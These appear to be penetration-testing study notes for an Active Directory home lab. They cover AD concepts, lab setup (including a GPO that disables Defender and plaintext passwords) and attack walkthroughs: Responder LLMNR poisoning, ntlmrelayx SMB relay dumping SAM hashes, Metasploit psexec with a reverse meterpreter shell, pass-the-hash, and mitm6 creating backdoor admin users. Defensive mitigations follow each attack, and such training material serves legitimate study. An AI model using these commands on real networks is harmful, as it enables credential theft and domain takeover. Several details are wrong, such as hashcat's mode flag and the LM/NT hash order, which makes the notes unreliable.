> # AD Overview
* Developed by Microsoft to manage Windows Domain Networks. Is it an **Identity Management Service**.
*  Stores information related to objects, such as Computers, Users, Printers, etc.
* Authenticates via Kerberos tickets. Non-windows devices, such as Linux machines, firewalls, etc. can also authenticate to AD via RADIUS or LDAP.

># AD Components

| Physical                           | Logical                  |
| ---------------------------------- | ------------------------ |
| Data Store                         | Partitions               |
| Domain Controller                  | Schema                   |
| Global Catalogue Server            | Domains                  |
| Read-only Domain Controller (RODC) | Domain Trees             |
|                                    | Forests                  |
|                                    | Sites                    |
|                                    | Organization Units (OUs) |


> ### Physical Components
1. **Domain Controller:** host a copy of the AD DS  (Active Directory Domain Services) directory store. Provides authentication and authorization services. Replicates updates to other domain controllers in the domain and forest. Allow administrative access to manage user account and network resources.
2. **AD DS Data Store:** contains the database files and processes that store and manage directory information for user, services and applications. Consists `Ntds.dit` file. Default path: `%SystemRoot%\NTDS folder` on all domain controllers. It is accessible **only** though domain controller processes and protocols.

---

>### Logical Components
- **AD DS Schema:** like a rulebook/blueprint, defines every type of objects that can be stores in the directory. Enforces rules regarding object creation and configuration.

| Object Types     | Function                                      | Examples       |
| ---------------- | --------------------------------------------- | -------------- |
| Class Object     | What objects can be created in the directory  | User, Computer |
| Attribute Object | Information that can be attached to an object | Display Name   |

>- **Domains:** are used to group and manage objects in an organization. An administrative boundary for applying policies to groups of objects. An authentication and authorization boundary that provides a way to limit the scope of access to resources. 
- **Trees:** hierarchy of domains in AD DS. Share a contiguous namespace with the parent domain. By default create a two-way transitive trust with other domain.
- **Forest:** collection of one or more domain trees. Shares common scheme, configuration partition, and a common global catalogue to enable searching. Enable trusts between all domain in the forest. Share Enterprise Admins and Schema Admins group.
- **Organizational Units (OUs):** are AD containers that contain users, groups, computers, and other OUs. It manages a collection of objects in a consistent way, apply policies, delegate permissions to administer group of objects.
- **Trusts:** provides a mechanism for users to gain access to resources in another domain. All domain in a forest trust all other domains in the forest. Trust CAN extend outside the forest. [How trusts work for Microsoft Entra Domain Services - Microsoft Entra ID `|` Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust)

| Type of Trusts | Description |
|----------------|-------------|
| **Directional** | One domain trusts the other, but not vice versa. This means users in the trusting domain can access resources in the trusted domain, but users in the trusted domain cannot access resources in the trusting domain. |
| **Transitive**  | If domain A trusts domain B, and domain B trusts domain C, then domain A automatically trusts domain C. This creates a "chain" of trust. |


>![Type of Trusts](/assets/images/Active-Directory/Type-of-Trusts.png)
>- **Objects:** lives inside of OUs, contains a lot of different things, e.g. Users, Groups, Computers, Printers, Shared folders. There are class object and attribute object.

---

>#### Setup Service Account fully (SQLService)
1. Open CMD with Administrator Privileges
2. `setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService`
3. Check: `setspn -T MARVEL.local -Q */*`

---

>### Setup Group Policy
#### 1. Create and Link a New GPO
- Open **Group Policy Management**  
- Navigate to:  
  `Forest → Domains → MARVEL.local`  
- Right-click the domain and select:  
  **Create a GPO in this domain, and Link it here**  
- Name the new GPO, for example: `Disable Windows Defender`  
- Right-click the newly created GPO → **Edit**

>#### 2. Edit the GPO to Disable Windows Defender
In the **Group Policy Management Editor**:
- Go to:  
  `Computer Configuration → Policies → Administrative Templates → Windows Components → Microsoft Defender Antivirus`
- Find and double-click: **Turn off Microsoft Defender Antivirus**
- Set the policy to **Enabled** → Click **OK**

>#### 3. Enforce the GPO
- In Group Policy Management, right-click the GPO you just created → Select **Enforced**

>#### 4. Result
- This GPO will now apply to **all domain-joined computers**.  
- Any new user or system joining the domain will automatically receive this policy and have Microsoft Defender Antivirus disabled.

---

>#### Setup Networking for the Domain
1. Open Network and Internet Settings → Change adapter options → Select Adapter → Properties → IPv4 → Use the following IP address → Change it to IPv4 and gateway address.
2. We will lose internet connection now because now we only have an static IP.
![Setup Networking](/assets/images/Active-Directory/Setup-Networking.png)

---

>## Joining Windows Workstations to the Domain
#### 1. Configure Network Settings on Workstations
- **THEPUNISHER:**  
  - Log in → Open **Change Adapter Settings** → Edit IPv4 properties  
  - Set the Domain Controller's IP address as the DNS server  
  ![Punisher Networking](/assets/images/Active-Directory/Punisher-Networking.png)
- **SPIDERMAN:**  
  - Repeat the same steps as above for SPIDERMAN  
  ![Spiderman Networking](/assets/images/Active-Directory/Spiderman-Networking.png)


>#### 2. Join Workstations to the Domain
- Navigate to **Settings** → **Accounts** → **Access work or school**  
- Click **Connect** → **Join this device to a local Active Directory domain**  
- Enter domain name: `MARVEL.local`  
- Provide credentials of a user authorized to join devices (e.g., `administrator:P@$$w0rd!` or `tstark:Password12345!`)  
- Set account type to **Administrator**  
- After joining, verify the computers appear in the Domain Controller as `THEPUNISHER` and `SPIDERMAN`.


>#### 3. Configure Local Administrator Accounts
- **THEPUNISHER:**  
  - Open **Local Users and Groups** → **Users**  
  - Set password for the `Administrator` account to `Password1!`  
  - Double-click `Administrator` and uncheck **Account is disabled**  
  - Go to **Groups** → **Administrators** → **Add** → add user `fcastle`  
  - Click **Check Names** (ensure Domain Controller is running), then **OK**  
  - Enable **Network Discovery**
- **SPIDERMAN:**  
  - Repeat the above steps for `Administrator` password and enable the account  
  - Add users `pparker` and `fcastle` to the **Administrators** group  
  - Enable **Network Discovery**

Note: `fcastle` will be an administrator on both workstations.


> #### 4. Logging in and Mapping Network Drives
- Log out, then log into SPIDERMAN as domain user `peterparker`  
  - To log in as a local user, use: `.\peterparker`  
- Open **File Explorer** → **This PC** → **Map Network Drive**  
- Enter network path: `\\HYDRA-DC\hackme`  
- Choose **Connect using different credentials**  
- Use domain admin credentials: `administrator:P@$$w0rd!`  
- Check **Remember my credentials**


>#### 5. Verify Network Profile on Domain Controller
Open PowerShell on the Domain Controller and run:
```powershell
Get-NetConnectionProfile
```

>### LLMNR Poisoning
##### What is LLMNR?
* Link Local Multicast Name Resolution, it is used to identify hosts when DNS fails to do so. Older version - NBT-NS. Key-flaw is that the service utilize a user's username and NTLMv2 hash when appropriately responded to. (we as an attack maliciously respond).

>![LLMNR Overview](/assets/images/Active-Directory/LLMNR-Overview.png)

>**Scenario:** A user does a typo while entering a Share name (hackm instead of hackme). The server have no idea where that is, so it broadcasts in the network if anyone know the location of "hackm". Now, we as an attacker responds YES to the computer asking for hackm's location, we know where hack just send me you hash and we'll connect you. And the computer passes us the hash.

---

>##### Capturing hash with Responder
1. ```
sudo responder -I eth0 -dw
```
	* -d: Enable answers for DHCP broadcast requests. Injects a  server in DHCP. (**WPAD (Web Proxy Auto-Discovery Protocol)** is a method for web browsers to automatically locate a Proxy Auto-Config (PAC) file.)
	* -w: To start a WPAD server
	* -P: To force NTML authentication
2. Login as `fcastle:Password12345!` from THEPUNISHER machine.
3. In the file explorer, search for your attacker's IP adderess `\\192.168.138.139`.
4. Responder will start to populate NTLMv2 hash of **fcastle**.
5. Now we have a hash to crack!
6. ```
hashcat -a 5600 rockyou.txt fcatle.hash
```

---

>##### LLMNR Poisoning Mitigations
* The best defence in this case is to disable LLMNR and NBT-NS.
1. Group Policy Management → Edit/Create a policy → Computer Configurations → Administrative Templates → Network → DNS Client → Turn off Multicast Name Resolution
2. Enable it → Apply → OK

>If you **must** have LLMNR Enabled
1. Configure Network Access Control.
2. Require strong user passwords. Long is not equals to Complex password!

---

>### SMB Relay
##### What is SMB Relay?
* Instead of cracking hashes gathered with Responder, we can relay those hashes to specific machines and potentially gain access.

>##### Requirements
1. SMB signing must be disabled or not enforced on the target. (which is default setting for workstations, but SMB signing is enabled/enforced on servers by default)
2. Relayed user credentials must be of local administrator of that machine for any retal value.
3. It must be relayed to a different machine. A user cannot relay the hash to himself/to his machine.

---

>##### Identify Hosts Without SMB Signing
1. ```bash
nmap --script=smb2-security-mode.nse -p445 <IP>
```
2. We are looking for "Message signing enabled but not required.

---

>##### Exploitation
1. ```bash
sudo nano /etc/responder/Responder.conf
```
 SMB and HTTP should be **off**.
2. Run responder:
```bash
sudo responder -I eth0 -dwP
```
3. Set up relay: 
```bash
sudo ntlmrelayx.py -tf target.txt -smb2support
```
Hash captured by responder is sent to ntmlrelayx which relays it to the target machines.
4. Event Occurrence: In the file explorer, search for your attacker's IP adderess `\\192.168.138.139`.
5. SAM hash will be dumped.
6. Interactive shell:
```bash
sudo ntlmrelayx.py -tf target.txt -smb2support -i
```
7. Run commands:
```bash
sudo ntlmrelayx.py -tf target.txt -smb2support -c "whoami
```

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e2963933876b30e03993e4915401c28f:::

```

---

>##### SMB Relay Attacks Defence
1. Enable SMB signing on all the devices. Con: can cause performance issue with the file copies.
2. Disable NTLM authentication on network. Con: If Kerberos stops working, Windows defaults back to NTLM (which is bad).
3. Account tiering: Limits domain admin to specific tasks. Con: Enforcing and maintaining the policy may be difficult.
4. Local Admin restriction: Can prevent a lot of lateral movement. Con: Potential increase in the amount of service desk tickets.

---

>## Gaining Shell Access
##### Metaspooit
###### Using Password
1. Metasploit's exploits are available, but they are too noisy, which often gets picked up by detection systems.
* ```bash
msfconsole
```
* ```bash
search psexec
```
Correct one: (/exploit/windows/smb/psexec)
* Set payload to 
```bash
windows/x64/meterpreter/reverse_tcp
```
* Set RHOST, smbdomain, sbmuser, smbpass
* ```bash
show targets
```
change if one doesn't work. 
* "Native Upload" works the best. → 
```bash
run
```

>##### NTLM attack (using hash)
* ```bash
unset SMBDomain
``` 
```bash
set smbuser administrator
``` 
```bash
set smbpass <hash>
```
* `Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::`

>The hash has two parts: NT and LM. We need both → `aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f`
First part before `:` it NT and after is LM.

>*
```bash
run
```

---

>#### psexec.py
##### Using Password
```bash
impackets-psexec MARVEL/fcastle:"Password12345!"@192.168.138.137
```

>OR, maybe if the password has a lot of characters that needs to be escaped do:
```bash
impackets-psexec MARVEL/fcastle:@<IP>
```
Then you can paste in the password.

>##### Using hash
```bash
impackets-psexec administrator@<IP> -hashes <hash>
```

>If psexec does not work for some case, there are **wmiexec** and **smbexec** which basically works the same. It depends on the settings on the target machine.

---

>### IPv6 Attacks
##### Overview
* This is a MitM attack where we as an attacker claims to be a DNS. Basically this can also be called a DNS takeover attack. Usually, a network does not use IPv6, still it is turned on. Network are generally utilizing IPv4. And, there no DNS for IPv6. As soon as we spoof the DNS server, all the IPv6 traffic is sent to us (spoofed IPv6 DNS server). With the authentication traffic (NTML) being sent though our DNS server, we can create a user (backdoor). This all is automated by a tool: **mitm6**.

---

>##### Exploitation
1. ```bash
ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
```
SMB to LDAP cannot be relayed, for that `-smb2support` flag can be used.
2. ```bash
mitm6 -d marvel.local
```
3. Restart THEPUNISHER PC, we can see all the traffic sent during re-activation of a computer to the domain. All the policies and the users.
4. Login as Administrator, now **mitm6** will use all the access control captured from the DNS traffic and create us a new user (backdoor).

```bash
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Attempting to create user in: CN=Users,DC=MARVEL,DC=local
[*] Adding new user with username: FPJpDEVBzB and password: >p/k;lY3F5}5NIj result: OK
[*] Querying domain security descriptor
[*] Adding new user with username: ohMyQxbdLo and password: 3ebbuJ>W#PZBMIV result: OK
```

* You can look for new users in the domain and you'll be able to see these users created by **mitm6**.

---

>##### Mitigation Strategies
1. Disable IPv6 internally, but probably not the best idea due to side effects.
2. Block instead of Allow prevents the attack from working:
	(Inbound) Core Networking - Dynamic Host Configuration Protocol
	for IPv6(DHCPV6-ln)
	(Inbound) Core Networking - Router Advertisement (ICMPv6-ln)
	(Outbound) Core Networking - Dynamic Host Configuration
	Protocol for IPv6(DHCPV6- out)
3. If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
4. Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
